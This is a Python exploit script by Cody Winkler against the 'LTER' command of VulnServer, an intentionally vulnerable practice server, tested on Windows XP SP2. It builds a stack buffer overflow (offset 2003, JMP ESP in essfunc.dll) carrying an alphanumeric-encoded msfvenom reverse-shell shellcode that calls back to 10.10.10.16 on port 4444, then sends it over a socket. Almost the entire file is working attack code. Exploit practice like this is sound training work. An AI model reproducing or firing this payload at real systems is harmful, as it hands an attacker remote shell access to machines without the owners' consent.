#!/usr/bin/env python
"""
Description: AlphaNumeric Buffer Overflow (Vanilla) via "LTER" in VulnServer
Author: Cody Winkler
Contact: @cwinfosec (twitter)
Date: 11/15/2019
Tested On: Windows XP SP2 EN

[+] Usage: python expoit.py <IP> <PORT> 

$ python exploit.py 127.0.0.1 9999
"""

import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# 62501203 in essfunc.dll

jmp_esp = struct.pack("<I", 0x62501203)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 --arch x86 --platform windows bufferregister=esp -e x86/alpha_mixed -f c
# x86/alpha_mixed chosen with final size 709

shellcode = ("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x49\x78\x4e\x62\x33\x30"
"\x45\x50\x53\x30\x53\x50\x4e\x69\x78\x65\x74\x71\x59\x50\x42"
"\x44\x4c\x4b\x56\x30\x70\x30\x4c\x4b\x53\x62\x44\x4c\x6c\x4b"
"\x36\x32\x37\x64\x6e\x6b\x52\x52\x57\x58\x34\x4f\x4e\x57\x43"
"\x7a\x47\x56\x45\x61\x4b\x4f\x4c\x6c\x67\x4c\x31\x71\x31\x6c"
"\x74\x42\x36\x4c\x67\x50\x7a\x61\x5a\x6f\x56\x6d\x63\x31\x6f"
"\x37\x38\x62\x49\x62\x33\x62\x33\x67\x6e\x6b\x66\x32\x42\x30"
"\x6c\x4b\x71\x5a\x47\x4c\x4e\x6b\x72\x6c\x67\x61\x50\x78\x48"
"\x63\x51\x58\x35\x51\x7a\x71\x32\x71\x6c\x4b\x71\x49\x45\x70"
"\x66\x61\x79\x43\x4c\x4b\x62\x69\x77\x68\x68\x63\x47\x4a\x50"
"\x49\x6e\x6b\x30\x34\x6e\x6b\x66\x61\x4e\x36\x64\x71\x39\x6f"
"\x6e\x4c\x39\x51\x48\x4f\x44\x4d\x66\x61\x49\x57\x37\x48\x69"
"\x70\x42\x55\x6c\x36\x55\x53\x31\x6d\x39\x68\x55\x6b\x43\x4d"
"\x55\x74\x33\x45\x7a\x44\x61\x48\x6e\x6b\x53\x68\x47\x54\x46"
"\x61\x58\x53\x62\x46\x4e\x6b\x66\x6c\x32\x6b\x4e\x6b\x31\x48"
"\x47\x6c\x53\x31\x6a\x73\x4c\x4b\x74\x44\x4e\x6b\x36\x61\x78"
"\x50\x4c\x49\x37\x34\x46\x44\x74\x64\x51\x4b\x31\x4b\x30\x61"
"\x76\x39\x32\x7a\x76\x31\x69\x6f\x69\x70\x53\x6f\x31\x4f\x32"
"\x7a\x4e\x6b\x55\x42\x58\x6b\x6c\x4d\x61\x4d\x51\x78\x56\x53"
"\x46\x52\x45\x50\x57\x70\x52\x48\x32\x57\x31\x63\x67\x42\x63"
"\x6f\x33\x64\x75\x38\x72\x6c\x70\x77\x44\x66\x34\x47\x49\x6f"
"\x6a\x75\x58\x38\x7a\x30\x73\x31\x47\x70\x45\x50\x55\x79\x4a"
"\x64\x30\x54\x70\x50\x62\x48\x61\x39\x4f\x70\x32\x4b\x73\x30"
"\x6b\x4f\x59\x45\x32\x70\x42\x70\x72\x70\x66\x30\x63\x70\x46"
"\x30\x31\x50\x42\x70\x51\x78\x7a\x4a\x64\x4f\x39\x4f\x4d\x30"
"\x6b\x4f\x69\x45\x4f\x67\x52\x4a\x36\x65\x43\x58\x37\x7a\x54"
"\x4a\x35\x5a\x44\x50\x73\x58\x55\x52\x47\x70\x52\x31\x43\x6c"
"\x4b\x39\x38\x66\x52\x4a\x74\x50\x46\x36\x51\x47\x53\x58\x4e"
"\x79\x39\x35\x42\x54\x55\x31\x59\x6f\x4a\x75\x4b\x35\x6b\x70"
"\x34\x34\x74\x4c\x79\x6f\x32\x6e\x64\x48\x30\x75\x38\x6c\x71"
"\x78\x4a\x50\x48\x35\x6c\x62\x42\x76\x6b\x4f\x6a\x75\x63\x58"
"\x32\x43\x70\x6d\x61\x74\x35\x50\x6c\x49\x39\x73\x42\x77\x53"
"\x67\x73\x67\x44\x71\x58\x76\x53\x5a\x65\x42\x72\x79\x76\x36"
"\x6b\x52\x49\x6d\x50\x66\x69\x57\x30\x44\x46\x44\x47\x4c\x65"
"\x51\x47\x71\x4e\x6d\x51\x54\x46\x44\x66\x70\x6f\x36\x67\x70"
"\x43\x74\x70\x54\x56\x30\x52\x76\x76\x36\x56\x36\x52\x66\x56"
"\x36\x62\x6e\x63\x66\x70\x56\x70\x53\x62\x76\x62\x48\x73\x49"
"\x48\x4c\x55\x6f\x4f\x76\x79\x6f\x7a\x75\x4b\x39\x6b\x50\x32"
"\x6e\x71\x46\x63\x76\x49\x6f\x36\x50\x71\x78\x34\x48\x4c\x47"
"\x35\x4d\x31\x70\x59\x6f\x59\x45\x4f\x4b\x48\x70\x38\x35\x4f"
"\x52\x56\x36\x51\x78\x79\x36\x4c\x55\x4f\x4d\x6f\x6d\x59\x6f"
"\x4b\x65\x57\x4c\x46\x66\x43\x4c\x37\x7a\x6f\x70\x59\x6b\x6d"
"\x30\x73\x45\x35\x55\x6d\x6b\x43\x77\x64\x53\x73\x42\x50\x6f"
"\x53\x5a\x45\x50\x61\x43\x4b\x4f\x7a\x75\x41\x41")

nopsled = "\x44"*16 # inc esp

# Overflowed with lter.spk "LTER /.:/(3520 A's)"
# Message=    EIP contains normal pattern : 0x386f4337 (offset 2003)

buffer = "LTER /.:/"
buffer += "A"*2003
buffer += jmp_esp
buffer += nopsled
buffer += shellcode
buffer += "C"*(3516-2003-len(jmp_esp)-len(nopsled)-len(shellcode))

try:
    print "[+] Connecting to target"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(1024)
    print "[+] Sent payload with length: %d" % len(buffer)
    s.send(buffer)
    s.close()
except:
    print "[-] Something went wrong :("
